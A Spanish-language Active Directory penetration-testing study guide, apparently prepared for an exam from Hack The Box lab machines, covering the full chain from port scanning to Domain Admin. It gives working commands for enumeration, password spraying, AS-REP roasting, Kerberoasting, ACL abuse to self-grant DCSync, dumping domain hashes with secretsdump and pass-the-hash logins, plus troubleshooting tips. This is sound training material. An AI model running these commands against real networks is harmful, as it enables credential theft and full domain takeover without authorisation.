# Guía Completa — Active Directory (de nmap a Domain Admin)

Documento único de flujo, construido y corregido tras 3 máquinas reales de práctica (HTB: Active, Forest, Sauna). Sigue el orden real de ataque a una máquina/set de AD. Cada comando tiene un comentario explicando **qué hace y por qué lo corres en ese momento**. Los bloques marcados con 🔴 son errores reales que salieron en práctica — no son hipotéticos, son los que de verdad te trabaron.

> Reglas del examen: Responder solo en modo análisis (nunca poisoning). Metasploit no sirve para pivotar. IA prohibida durante el examen real — esto es material de preparación.

---

## FASE 0 — Reconocimiento inicial (encontrar que es AD)

```bash
# rustscan es más rápido que nmap para el descubrimiento inicial de puertos.
rustscan -a <IP> --ulimit 5000 -- -sCV
```

```bash
# nmap puro — nunca te quedes solo con el top-1000
sudo nmap -p- --min-rate=5000 -T4 -Pn <IP> -oN nmap_allports.txt
sudo nmap -p<PUERTOS_ENCONTRADOS> -sCV -T4 -Pn <IP> -oN nmap_detail.txt
```

**Cómo saber que es Active Directory con solo mirar el nmap:**

| Puerto | Servicio | Por qué confirma AD |
|--------|----------|---------------------|
| 53 | DNS | AD suele ser su propio servidor DNS |
| 80/443 | HTTP(S) | Portales internos — a veces revelan nombres de empleados (ver Fase 1) |
| 88 | Kerberos | El protocolo de autenticación del dominio — ¡es un DC! |
| 135 | MSRPC | Llamadas a procedimiento remoto de Windows |
| 139/445 | SMB | Shares de red, enumeración de usuarios |
| 389/636 | LDAP / LDAPS | El directorio en sí |
| 464 | kpasswd | Cambio de contraseñas vía Kerberos |
| 3268/3269 | Global Catalog | Búsquedas across todo el forest |
| 5985/5986 | WinRM | Shell remota de PowerShell |
| 9389 | ADWS | AD Web Services |

```bash
# Descubrir el hostname/dominio real — NUNCA lo adivines
nxc smb <IP>
# Output: "(name:HOSTNAME) (domain:DOMINIO)" ← ESO es tu dominio real
```

```bash
# Agrega el DC a tu /etc/hosts INMEDIATAMENTE, con TODAS las formas del nombre.
# Sin esto, Kerberos y bloodhound-python fallan con errores de DNS confusos.
echo "<IP> <HOSTNAME>.<DOMINIO> <DOMINIO> <HOSTNAME>" | sudo tee -a /etc/hosts
# Ejemplo real: echo "10.129.74.144 SAUNA.EGOTISTICAL-BANK.LOCAL egotistical-bank.local SAUNA" | sudo tee -a /etc/hosts
```

> 🔴 **Error real visto en 2 de 3 máquinas:** si conectaste una VPN de un lab DISTINTO antes (ej: hiciste un módulo de Port Scanning y luego pasas a AD), tu `/etc/hosts` puede tener entradas VIEJAS de otro rango de IP que confunden todo. Revisa con `cat /etc/hosts` si hay entradas conflictivas antes de asumir que el problema es de la máquina actual.

---

## FASE 1 — Enumeración SIN credenciales

```bash
# Null session de SMB
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u 'guest' -p '' --shares

# RPC anónimo
rpcclient -U "" -N <IP>
#   enumdomusers     → lista usuarios del dominio
#   enumdomgroups    → lista grupos

# Enumeración automatizada combinada
enum4linux-ng -A <IP>

# LDAP con bind anónimo
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

```bash
# Shares — busca nombres propios (no C$/ADMIN$/IPC$)
smbclient -L //<IP>/ -N
smbclient //<IP>/<share> -N
#   ls / cd <carpeta> / get <archivo>
#   prompt OFF; recurse ON; mget *   ← descarga TODO recursivamente
```

**Qué buscar en shares:** `Groups.xml` (GPP, ver Fase 2), scripts de login, backups, notas con credenciales.

### Enumeración de usuarios vía WEB (si el puerto 80/443 está abierto)

Una web con nombres de empleados es otra fuente de usuarios — obtienes **nombres completos**, no usernames, así que hay que convertirlos.

```bash
# Enumera la web normalmente, encuentra la página con nombres de empleados
whatweb http://<IP>/
feroxbuster -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Genera variantes de username con `username-anarchy`:**
```bash
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy
chmod +x username-anarchy

# Prueba con UN nombre primero para confirmar que funciona:
./username-anarchy John Smith
# → jsmith, john.smith, smithj, j.smith, johns, etc. (8-15 variantes por persona)
```

> 🔴 **Error real — heredoc de bash:** para crear un archivo con varios nombres de una vez, el bloque completo (incluyendo el `EOF` final) debe pegarse TODO JUNTO en la terminal, no línea por línea:
> ```bash
> cat <<EOF > nombres.txt
> Shaun Coins
> Sophie Driver
> Bowie Taylor
> EOF
> ```
> Verifica con `cat nombres.txt` que se creó bien antes de seguir.

> 🔴 **Error real — el loop generaba solo 1 variante por persona en vez de 10+:** la causa fue usar `while read -r linea` (una sola variable con "Nombre Apellido" junto) en vez de separar en dos campos. La versión que SÍ funciona:
> ```bash
> # MAL (genera solo 1 variante, rompe el paso de argumentos):
> while read -r linea; do ./username-anarchy $linea; done < nombres.txt
>
> # BIEN (separa nombre y apellido en variables distintas):
> while read -r nombre apellido; do ./username-anarchy "$nombre" "$apellido"; done < nombres.txt > users_generated.txt
> ```
> Confirma con `wc -l users_generated.txt` — debe ser MUCHO más que el número de personas (8-15x).

**Valida cuáles usernames generados existen REALMENTE en el dominio:**
```bash
nxc smb <IP> -u users_generated.txt -p '' 2>&1 | grep -v "STATUS_LOGON_FAILURE"
```

---

## FASE 2 — Explotación de hallazgos comunes SIN credenciales de dominio

### GPP / Group Policy Preferences — credenciales cifradas en Groups.xml

```bash
cat Groups.xml
# Busca el atributo cpassword="..." — cifrado con una clave AES que Microsoft
# publicó públicamente por error hace años. Cualquiera puede descifrarlo.

gpp-decrypt '<VALOR_DE_CPASSWORD>'
# Te da la contraseña en texto plano. Revisa el atributo "userName" del mismo
# XML para saber a qué cuenta pertenece.
```

### Password spraying con usuarios enumerados
```bash
nxc smb <IP> -u users.txt -p ''
nxc smb <IP> -u users.txt -p 'Password123'
# OJO: puede bloquear cuentas si hay política de lockout agresiva.
```

---

## FASE 3 — Ya tienes UNA credencial de dominio (foothold en AD)

```bash
# 1. Confirma DÓNDE funcionan, escaneando el RANGO completo, no solo el DC
nxc smb <SUBNET>/24 -u '<user>' -p '<pass>'
# Busca "(Pwn3d!)" — significa admin local en esa máquina específica.
```

```bash
# 2. Enumeración con credenciales — mucho más rica que la anónima
nxc smb <IP> -u '<user>' -p '<pass>' --users
nxc smb <IP> -u '<user>' -p '<pass>' --groups
nxc smb <IP> -u '<user>' -p '<pass>' --shares
```

```bash
# 3. LDAP con credenciales y filtros específicos
# Básico: usuarios Y computadoras mezclados (las de máquina terminan en $)
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(objectClass=user)" sAMAccountName -LLL

# Filtro para EXCLUIR cuentas de computadora:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(!(objectClass=computer)))" sAMAccountName -LLL

# Cuentas con SPN configurado (candidatas a Kerberoasting) — anticipa el vector:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName -LLL
```

```bash
# 4. RPC con credenciales — canal DISTINTO a LDAP, a veces revela usuarios que LDAP no
rpcclient -U "<user>%<pass>" <IP> -c "enumdomusers" | grep -oP '(?<=\[)[^\]]+(?=\] rid)' > users_rpc.txt
```

> 🔴 **Lección real (pasó en Forest):** AS-REP Roasting no encontraba ningún usuario vulnerable con la lista de LDAP. Al cruzar contra la lista de RPC, aparecieron 2 usuarios (`lucinda`, `mark`) que LDAP anónimo no había mostrado — el bind anónimo de LDAP puede tener restricciones de visibilidad que RPC/SAMR no tiene.
> ```bash
> diff <(sort users_ldap.txt) <(sort users_rpc.txt)
> ```
> **Siempre cruza al menos 2 fuentes de enumeración de usuarios antes de asumir que tu lista está completa.**

---

## FASE 4 — BloodHound (el mapa completo del dominio)

### Instalación
```bash
sudo apt install bloodhound -y
bloodhound-start
# Primera vez pide bloodhound-setup (acepta "y"). Abre Neo4j en :7474
# (paso INTERMEDIO, no la interfaz final) y te da user admin + pass para :8080.
```

### 🔴 Checklist de arranque si BloodHound no responde
Esto costó más de 30 minutos reales de diagnóstico — sigue este orden exacto:

```bash
# 1. ¿Ya está arriba, o la terminal solo parece colgada?
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
# 200 = ya está arriba. 000 = sigue caído.

# 2. LA CAUSA #1 MÁS COMÚN: Postgres "parece" activo pero NO lo está.
#    systemctl status postgresql puede decir "active (exited)" — ESO ES MENTIRA,
#    es solo un servicio meta. Verifica la instancia REAL:
sudo pg_lsclusters
# Si Status dice "down":
sudo pg_ctlcluster <VERSION_EXACTA_MOSTRADA> main start
# ejemplo real: sudo pg_ctlcluster 18 main start

# 3. Confirma Neo4j por separado:
ps aux | grep neo4j
sudo neo4j start    # si no hay proceso vivo (usa "start", no "console", para no bloquear la terminal)

# 4. Reinicia el backend y confirma:
sudo systemctl restart bloodhound
sudo journalctl -u bloodhound -n 20 --no-pager -o cat   # -o cat evita que se corte el mensaje de error
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
```

### Generar y subir los datos
```bash
# -d es el DOMINIO (NO -g, rompe la resolución DNS)
# --zip es específico de BloodHound CE
bloodhound-python -u <user> -p <pass> -d <dominio> -ns <DC_IP> -c all --zip
```

> 🔴 **Corre esto SIEMPRE desde tu propia carpeta de trabajo** (`cd ~/htbmachines` o similar), nunca desde `/` — puede fallar con `PermissionError: [Errno 13] Permission denied` al intentar escribir los `.json` en un directorio sin permisos de escritura para tu usuario.

> 🔴 **Si falla con `Name or service not known` o resuelve IPs IPv6 raras (`dead:beef::...`):** agrega el DC a `/etc/hosts` primero (Fase 0) y usa `-dc <HOSTNAME_COMPLETO>` explícito:
> ```bash
> bloodhound-python -u <user> -p <pass> -d <dominio> -ns <DC_IP> -dc <HOSTNAME>.<dominio> -c all --zip
> ```

> 🔴 **Si falla con `KRB_AP_ERR_SKEW (Clock skew too great)`:** tu reloj de Kali está desincronizado con el del DC (Kerberos es muy estricto con el tiempo). Sincroniza:
> ```bash
> sudo ntpdate <DC_IP>
> # o si no tienes ntpdate: sudo timedatectl set-ntp true
> ```
> En la práctica, la herramienta suele caer automáticamente a NTLM y seguir funcionando igual — no siempre es bloqueante.

> 🔴 **Si da error LDAP `data 52e` (LOGON_FAILURE):** NO es un problema de BloodHound, son las credenciales. Señal de alerta clave: **si 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente, sospecha del dato copiado, no de la técnica.** Reescribe usuario y password A MANO, sin copiar/pegar.

Sube el `.zip` en `localhost:8080` → menú lateral → ícono de subida ("Upload Files" / "Quick Upload").

### Navegación — 3 pestañas
- **SEARCH**: busca tu usuario, revisa "Object Information" (¿Kerberoastable? ¿AS-REP roasteable? ¿Allows Unconstrained Delegation?).
- **PATHFINDING**: Start Node = tu usuario, End Node = `DOMAIN ADMINS@<DOMINIO>`. Más simple que Cypher, no necesita marcar "Owned".
- **CYPHER**: solo lectura en BloodHound CE (no `SET` para marcar Owned — usa Pathfinding).

```cypher
// Todos los edges de un tipo específico en todo el dominio
MATCH p=(n)-[:WriteDacl]->(m) RETURN p

// Cuentas Kerberoastable de un vistazo
MATCH (n:User {hasspn:true}) RETURN n
```

**Prioriza por familia de edge, no por número de saltos:**
```
1. ACL (GenericAll, WriteDacl, WriteOwner, AddMember, GetChanges/GetChangesAll...)
   → ejecutable YA, sin depender de nada más
2. Kerberos (Kerberoastable, AS-REPRoastable)
   → ejecutable YA, pero depende de crackear el hash
3. Sesión (HasSession, AdminTo hacia máquina que NO controlas)
   → esconde trabajo previo no mostrado en el grafo
```
**Ojo con la dirección de la flecha:** un edge DESDE un grupo administrativo HACIA tu usuario es la relación normal (te administran a ti) — no explotable. Solo importa si sale DESDE tu nodo HACIA el objetivo.

> **Nota real:** no todos los caminos son cadenas largas. En una máquina, `svc_loanmgr` tenía `GetChangesAll` **directo sobre el dominio, 1 solo salto** — sin ninguna cadena de grupos. Siempre revisa Pathfinding primero antes de asumir que necesitas una cadena compleja como en el ejemplo de Fase 8.

---

## FASE 5 — Ataques de Kerberos

```bash
# ── AS-REP Roasting ── (GetNPUsers, "NP" = No Preauth)
# Ataca cuentas con "Do Not Require Pre-Authentication" = TRUE.
# NO necesitas password válido si usas -usersfile con -no-pass.
impacket-GetNPUsers <dominio>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
# Hash: $krb5asrep$23$... → hashcat -m 18200

# ── Kerberoasting ── (GetUserSPNs, "SPN" = Service Principal Name)
# Ataca cuentas de SERVICIO (nombres tipo SVC_*) con SPN configurado.
# SÍ necesitas credenciales válidas de antemano.
impacket-GetUserSPNs <dominio>/<user>:<pass> -dc-ip <DC_IP> -request
# Hash: $krb5tgs$23$... → hashcat -m 13100
```

> 🔴 **CONFUSIÓN REAL más frecuente de las 3 máquinas:** `GetNPUsers` (AS-REP) y `GetUserSPNs` (Kerberoasting) atacan vulnerabilidades DISTINTAS en cuentas DISTINTAS. Si corres `GetNPUsers` y ves `"User X doesn't have UF_DONT_REQUIRE_PREAUTH set"` para TODOS tus usuarios, no es que el comando esté mal — significa que NINGUNO es AS-REP roasteable, y probablemente necesitas `GetUserSPNs` en su lugar (especialmente si ves cuentas con nombre `SVC_*`).
> **Regla mental:** nombre de cuenta de servicio (`SVC_algo`) → piensa Kerberoasting primero, no AS-REP.

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

---

## FASE 6 — Movimiento lateral

```bash
# ANTES de elegir herramienta, confirma qué puerto está abierto
nmap -p445,5985,5986 <IP>
```

```bash
# Si 5985/5986 (WinRM) abierto → evil-winrm
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NT_HASH>          # Pass-the-Hash

# Si 5985 CERRADO pero 445 abierto → impacket-psexec o wmiexec
impacket-psexec  <dominio>/<user>:<pass>@<IP>      # crea un servicio (más ruidoso)
impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # vía WMI (más discreto)
```

> 🔴 **Señal de alerta #1 — `Errno::ECONNREFUSED` en 5985:** el puerto está cerrado. Cambia inmediatamente a psexec/wmiexec, no reintentes evil-winrm.

> 🔴 **Señal de alerta #2 — WinRM conecta (ves el prompt `PS C:\>`) pero CUALQUIER comando da `WinRMAuthorizationError`:** las credenciales son correctas, pero ese usuario NO está en el grupo "Remote Management Users". Vi esto pasar en 2 de 3 máquinas, con 2 cuentas de servicio distintas (`svc-alfresco` en Forest, y otro caso en Sauna). **No es un error tuyo — esa cuenta simplemente no tiene autorización de ejecución vía WinRM, aunque autentique.** Prueba con SMB (psexec/wmiexec) en su lugar; si SMB también rechaza (`STATUS_LOGON_FAILURE`), no es autorización, son las credenciales (ver alerta #3).

> 🔴 **Señal de alerta #3 — 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente con LOGON_FAILURE:** sospecha del dato copiado, no de la configuración. Reescribe usuario Y password a mano.

> 🔴 **Señal de alerta #4 — `--local-auth`:** si sospechas que la cuenta es LOCAL de la máquina (no de dominio), prueba:
> ```bash
> nxc smb <IP> -u '<user>' -p '<pass>' --local-auth
> nxc winrm <IP> -u '<user>' -p '<pass>' --local-auth
> ```
> Si Kerberos da `KDC_ERR_C_PRINCIPAL_UNKNOWN (Client not found in Kerberos database)`, el principal no existe como cuenta de DOMINIO con ese nombre exacto — verifica el username (ver Fase 7).

---

## FASE 7 — WinPEAS y post-explotación (encontrar credenciales de autologin, privesc)

```bash
# En Kali: sirve winPEAS desde la carpeta CORRECTA donde está el binario
find / -iname "winPEAS*" 2>/dev/null
# En Kali suele venir preinstalado en /usr/share/peass/winpeas/

cd /usr/share/peass/winpeas/    # ¡MUÉVETE A ESA CARPETA! No sirvas desde ~/
python3 -m http.server 80
```

> 🔴 **Error real — 404 al descargar:** corriste `http.server` desde tu `~` (home), pero el archivo estaba en `/usr/share/peass/winpeas/`. Verifica siempre con `curl -s http://localhost:80/winPEASx64.exe -o /dev/null -w "%{http_code}\n"` (debe dar 200) ANTES de intentar la descarga desde Windows.

> 🔴 **Error real — "Unable to connect to the remote server" al descargar desde Windows:** usaste tu IP de red LOCAL de VMware (`192.168.x.x`), no tu IP de la VPN del lab. La máquina objetivo solo puede alcanzar tu interfaz `tun0`:
> ```bash
> ip a | grep tun0 -A2   # busca la IP 10.x.x.x, esa es la correcta para el target
> ```

```powershell
# Desde tu shell de Windows (evil-winrm), con la IP de VPN correcta:
Invoke-WebRequest -Uri "http://<TU_IP_TUN0>/winPEASx64.exe" -OutFile "C:\Windows\Temp\wp.exe"
C:\Windows\Temp\wp.exe > C:\Windows\Temp\winpeas_output.txt
```

### 🔴 Traer el archivo de vuelta a Kali — el bug de barras invertidas de evil-winrm

```
download C:\Windows\Temp\winpeas_output.txt
```
Esto puede fallar con `Error: Download failed. Check filenames or paths`, y el mensaje de info mostrará la ruta MAL formada (ej: `C:WindowsTempwinpeas_output.txt`, sin ninguna barra interna). **Causa:** los comandos `download`/`upload` de evil-winrm usan Readline (Ruby), que trata `\` como carácter de escape y se lo come.

**Solución — usa barras normales `/` SOLO para estos dos comandos:**
```
download C:/Windows/Temp/winpeas_output.txt
```
(Esto NO afecta a comandos normales de PowerShell como `Invoke-WebRequest`, que sí acepta `\` bien — el bug es específico de `download`/`upload`.)

### 🔴 El archivo descargado no se puede buscar con grep — problema de encoding

```bash
grep -i "autologon" winpeas_output.txt
# → no encuentra NADA, aunque el archivo tenga contenido real
```
**Causa:** PowerShell redirige (`>`) su salida en **UTF-16LE** por defecto. `grep` espera UTF-8/ASCII y no hace match aunque el texto esté ahí.

**Solución — convierte antes de buscar:**
```bash
file winpeas_output.txt
# → "Unicode text, UTF-16, little-endian text..." confirma el problema

iconv -f UTF-16LE -t UTF-8 winpeas_output.txt -o winpeas_utf8.txt
grep -i -A5 "autologon\|autologin\|DefaultUserName\|DefaultPassword" winpeas_utf8.txt
```

### Buscar credenciales de autologin y otros vectores
```bash
grep -i -A5 "autologon\|autologin\|DefaultUserName\|DefaultPassword" winpeas_utf8.txt
grep -i -B2 -A15 "Scheduled Tasks\|scheduled task" winpeas_utf8.txt
grep -i -B2 -A10 "SeImpersonate\|SeAssign\|AlwaysInstallElevated\|unquoted" winpeas_utf8.txt
```

> 🔴 **LECCIÓN CRÍTICA — el `DefaultUserName` del registro puede NO coincidir con el nombre real de la cuenta de Windows.** En un caso real: winPEAS mostró `DefaultUserName: DOMINIO\svc_loanmanager`, pero la cuenta REAL en el sistema era `svc_loanmgr` (confirmado por el path del directorio home, `C:\Users\svc_loanmgr`, que winPEAS también mostraba más arriba en el mismo archivo). El nombre largo en el registro puede ser un error de configuración real de la máquina, no tuyo.
> **Siempre cruza el `DefaultUserName` contra los directorios reales en `C:\Users\` (`dir C:\Users`) antes de gastar tiempo probando variantes de conexión con un nombre que puede estar mal.**

> 🔴 **También verifica el password por caracteres invisibles** (retorno de carro `\r` sobrante de la conversión UTF-16→UTF-8):
> ```bash
> grep "DefaultPassword" winpeas_utf8.txt | sed 's/DefaultPassword\s*:\s*//' | tr -d '\r'
> ```
> Compara el resultado limpio contra lo que has estado usando — un `\r` invisible al final hace que el password "se vea igual" pero falle la autenticación.

> 🔴 **Verificar la clave del registro DIRECTAMENTE (`reg query`) puede fallar con `WinRMAuthorizationError` aunque `whoami` funcione bien** — `HKLM\...\Winlogon` a veces requiere privilegios más altos que los del usuario actual, incluso si ese mismo usuario puede ejecutar otros comandos sin problema. No es un error general de tu sesión, es específico de esa clave protegida. En ese caso, tu única fuente confiable queda siendo el archivo ya generado por winPEAS (que a veces sí puede leerla por un método distinto).

---

## FASE 8 — Escalada por cadena de ACL (cuando el camino tiene VARIOS saltos de grupo)

Caso real completo — cuando tu usuario no tiene un ACL directo, sino una cadena de membresías anidadas terminando en un grupo con WriteDacl sobre el dominio:

```
tu_usuario → MemberOf → Grupo A → MemberOf → Grupo B
   → GenericAll → Grupo C (ej: "Exchange Windows Permissions")
   → WriteDacl → EL DOMINIO
```

```bash
# Paso 1 — únete al grupo intermedio que tiene el WriteDacl
net rpc group addmem "<GRUPO>" "<tu_usuario>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>

# SIEMPRE verifica que de verdad se aplicó — net rpc puede fallar SIN mostrar error:
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

> 🔴 **`net rpc group addmem` puede "funcionar" sin error visible y NO aplicar el cambio realmente** — pasa cuando el privilegio viene de membresía anidada, no de un permiso directo tuyo. **Verifica SIEMPRE con `net rpc group members` después, nunca asumas éxito por falta de error.**

**Alternativa que SÍ funciona cuando `net rpc` falla silenciosamente — LDAP directo:**
```bash
# 1. Confirma el DN exacto del grupo objetivo (no asumas la OU)
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(cn=<GRUPO>)" distinguishedName

# 2. Confirma el DN exacto de tu propio usuario
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(sAMAccountName=<tu_usuario>)" distinguishedName

# 3. LDIF con AMBOS DN exactos
cat <<EOF > add_member.ldif
dn: <DN_EXACTO_DEL_GRUPO>
changetype: modify
add: member
member: <DN_EXACTO_DE_TU_USUARIO>
EOF

# 4. Aplica
ldapmodify -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -f add_member.ldif

# 5. Verifica de nuevo
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

```bash
# Paso 2 — auto-concédete DCSync (GetChanges + GetChangesAll)
# INMEDIATAMENTE después del paso 1, SIN esperar.
impacket-dacledit -action write -rights DCSync -principal <tu_usuario> -target-dn "DC=<dom>,DC=<tld>" <dominio>/<tu_usuario>:<tu_pass> -dc-ip <DC_IP>
# Éxito: "[*] DACL modified successfully!"
```

> 🔴 **LECCIÓN DE TIMING (real, costó varios intentos):** la membresía de grupo puede tardar en propagarse al token de sesión, o revertirse en labs con protección. Si el Paso 2 falla con `INSUFF_ACCESS_RIGHTS` la primera vez, **repite el Paso 1 y ejecuta el Paso 2 justo después, sin dejar pasar tiempo entre medio.** No asumas que la membresía "ya quedó" solo porque la viste una vez — vuelve a verificar (paso 5) cada vez antes de reintentar el dacledit.

> 🔴 **CONFLICTO DE PYTHON — `impacket-dacledit` (o `nxc`, o cualquier herramienta que use `dns.resolver`) puede fallar con un traceback largo** terminando en `ImportError: cannot import name 'asn1' from 'cryptography.hazmat'`. **Causa real:** instalar otra herramienta con `pip install --break-system-packages` (ej: bloodyAD) actualiza `cryptography` a una versión incompatible con `service-identity`/`aioquic`, y esto CONTAMINA CUALQUIER otra herramienta de Python que dependa de esa cadena — no solo la que instalaste.
>
> **NO persigas versiones exactas de `cryptography` a mano** (bajarla rompe otra herramienta, subirla rompe otra distinta — es un agujero sin fondo). Dos soluciones reales:
> ```bash
> # Solución A — si el conflicto afecta a UNA herramienta puntual (ej: dacledit), aísla en venv:
> python3 -m venv ~/venv-impacket
> source ~/venv-impacket/bin/activate
> pip install impacket
> # corre el comando de impacket aquí dentro
> deactivate
>
> # Solución B — si el conflicto ya se propagó a herramientas del SISTEMA (ej: nxc dejó de
> # funcionar), la causa es una versión de cryptography instalada en tu ruta de usuario
> # (~/.local/lib/python.../site-packages/) con prioridad sobre la del sistema. Elimínala:
> pip uninstall cryptography --break-system-packages -y
> nxc --help   # confirma que volvió a funcionar
> ```

```bash
# Paso 3 — DCSync real
impacket-secretsdump -just-dc <dominio>/<user>:<pass>@<DC_IP>
```
**Si da `ERROR_DS_DRA_BAD_DN`:** casi siempre significa que los permisos de DCSync todavía no están bien aplicados — vuelve al Paso 2, no es un error de sintaxis de este comando.

> 🔴 **Si el dump completo no muestra el hash de Administrator** (aparecen otras cuentas pero no esa), pide la cuenta específica directamente en vez de asumir que el volcado completo la incluye siempre:
> ```bash
> impacket-secretsdump -just-dc-user Administrator <dominio>/<user>:<pass>@<DC_IP>
> ```

---

## FASE 9 — Pass-the-Hash final y captura de flags

```bash
evil-winrm -i <DC_IP> -u Administrator -H <NT_HASH>
# Si WinRM no coopera: impacket-psexec <dominio>/Administrator@<DC_IP> -hashes :<NT_HASH>
```

```cmd
:: Recuerda: cmd.exe/PowerShell de Windows, NO bash
:: cat NO existe → usa type       ls NO es nativo → usa dir
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<usuario_inicial>\Desktop\user.txt

:: Si una flag "no es aceptada" al enviarla, sospecha de caracteres invisibles:
certutil -encodehex C:\Users\Administrator\Desktop\root.txt tmp.hex
type tmp.hex
```

> 🔴 **Si `dir` en cmd muestra warnings de "Decoding error, consider running chcp.com"** (típico con `impacket-wmiexec`) — no afecta el contenido real del archivo, es solo un problema de codificación de caracteres en la consola. El `type` del archivo sigue siendo confiable.

---

## Resumen del flujo completo

```
nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
   → enumeración SIN creds (null session, RPC anónimo, shares, WEB si hay puerto 80)
   → ¿GPP/Groups.xml? → gpp-decrypt → credencial #1
   → enumeración CON creds (nxc, LDAP con filtros, RPC — CRUZA AMBAS fuentes)
   → BloodHound (verificar arranque con pg_lsclusters si no responde)
   → priorizar camino: ACL > Kerberos > Sesión
   → ejecutar técnica del camino elegido → nueva credencial/acceso
   → movimiento lateral (evil-winrm/psexec/wmiexec — confirmar puerto primero)
   → si WinRM autoriza mal: sospechar grupo "Remote Management Users"
   → winPEAS (servir desde carpeta correcta, IP de VPN, convertir UTF-16→UTF-8 antes de grep)
   → ¿autologin encontrado? CRUZAR contra directorios reales en C:\Users (nombre puede diferir)
   → repetir BloodHound con el nuevo usuario si hace falta
   → DCSync (directo si ya tienes el edge, o vía cadena ACL con net rpc/ldapmodify + dacledit)
   → Pass-the-Hash al DC con el hash del Administrator
   → flags (user.txt / root.txt / proof.txt)
```

## Checklist mental de "cuando algo no funciona" (aplica en CUALQUIER fase)

1. **¿2+ protocolos distintos rechazan la misma credencial?** → sospecha del dato copiado (usuario o password), no de la técnica. Reescribe a mano.
2. **¿Un comando "no da error" pero tampoco parece haber funcionado?** → verifica el resultado explícitamente, nunca asumas éxito por ausencia de error (`net rpc addmem`, membresías, etc.).
3. **¿Herramienta de Python rota con traceback de `cryptography`/`aioquic`?** → conflicto de dependencias de otra instalación reciente, no tu comando. Usa venv aislado o `pip uninstall cryptography --break-system-packages -y`.
4. **¿grep no encuentra nada en un archivo que "debería" tenerlo?** → revisa el encoding con `file archivo.txt` (busca UTF-16 de PowerShell) y conviértelo con `iconv` primero.
5. **¿WinRM conecta pero no ejecuta nada?** → autenticación ok, autorización no — el usuario no está en "Remote Management Users". Cambia de protocolo (SMB/psexec/wmiexec).
6. **¿Ninguna variante de conexión funciona con un usuario "confirmado"?** → cruza el nombre contra otra fuente (directorio real en `C:\Users`, lista de RPC vs LDAP) — el dato de origen puede estar mal o desactualizado.
